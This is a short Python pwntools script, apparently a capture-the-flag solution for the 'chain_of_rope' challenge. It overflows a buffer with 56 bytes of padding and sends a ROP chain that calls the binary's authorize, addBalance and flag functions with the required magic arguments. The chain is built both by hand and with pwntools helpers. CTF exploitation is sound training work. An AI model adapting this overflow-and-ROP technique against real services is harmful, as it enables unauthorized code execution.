from pwn import *

#: Connect to chall server
HOST = 'shell.actf.co'
PORT = 19400
binary = ELF('./chain_of_rope')
rop = ROP(binary)
# p = binary.process()
p = remote(HOST,PORT)
print(p.recv())

#: Exploit code
offset = 'A' * 56
authorize = binary.symbols['authorize']
addBalance = binary.symbols['addBalance']
flag = binary.symbols['flag']

#: Gadgets
pop_rdi = p64(0x4008f3)
pop_rsi = p64(0x4008f1)

#: Rop Chain v1
# context.clear(arch='amd64')
# rop.raw(offset)
# rop.raw(p64(authorize))
# rop.raw(pop_rdi)
# rop.raw(p64(0xdeadbeef))
# rop.raw(p64(addBalance))
# rop.raw(pop_rdi)
# rop.raw(p64(0xba5eba11))
# rop.raw(pop_rsi)
# rop.raw(p64(0xbedabb1e))
# rop.raw(p64(flag))
# rop.raw(p64(flag))
# exploit = rop.chain()

#: ROP Chain v2
context.clear(arch='amd64')
rop.call(authorize)
rop.call(addBalance, [0xdeadbeef])
rop.call(flag, [0xba5eba11, 0xbedabb1e])
print(rop.dump())
exploit = offset + rop.chain()

#: Send payload
p.sendline('1')
p.sendline(str(exploit))
print(p.recvall(timeout=5))
